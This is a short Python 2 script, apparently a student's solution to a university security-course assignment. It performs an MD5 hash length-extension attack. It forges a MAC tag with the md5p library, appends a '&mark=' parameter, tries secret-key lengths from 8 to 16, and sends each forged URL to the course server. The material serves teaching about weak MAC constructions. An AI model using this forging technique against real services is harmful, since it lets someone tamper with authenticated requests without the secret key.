import httplib, urlparse, urllib, sys
url = sys.argv[1]
mark =sys.argv[2]
# ADD CODE HERE
#url = "https://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/01/server/?tag=a9ebd4ad4e6f2478a25c638fee58f9f0&utorid=fengxia9"
#mark = "100"

from md5p import md5, padding
# get the string before the tag(hash) which is "http://mathlab.../server/
url_str = url.split('?')[0]
# get the hash code from url which is "a9ebd4ad...f0"
hash_code = url.split('=')[1].split('&')[0]
# get the part with format "&utorid=..."
utorid_code = '&' + url.split('&')[1]
# get the student's utorid
utorid = utorid_code[1:].split('=')[1]

# get from d27 hash length-extension attack slides
# https://mathlab.utsc.utoronto.ca/courses/cscd27f16/handout/hash-extension.html
m = md5(state = hash_code.decode("hex"), count = 512)
newmark = "&mark=" + mark + "&utorid=" + utorid
m.update(newmark)

# loop keylength in range(8, 17)
for i in range(8, 17):
    length = (len(utorid_code) + i) * 8
    pad = padding(length)
    
    # form the new url
    url = url_str + "?tag=" + m.hexdigest() + utorid_code + urllib.quote(pad) + newmark
    # parameter url is the attack url you construct
    parsedURL = urlparse.urlparse(url)

    # open a connection to the server
    httpconn = httplib.HTTPSConnection(parsedURL.hostname)
    
    # issue server-API request
    httpconn.request("GET", parsedURL.path + "?" + parsedURL.query)
    
    # httpresp is response object containing a status value and possible message
    httpresp = httpconn.getresponse()
    
    # valid request will result in httpresp.status value 200
    print httpresp.status
    
    # in the case of a valid request, print the server's message
    print httpresp.read()
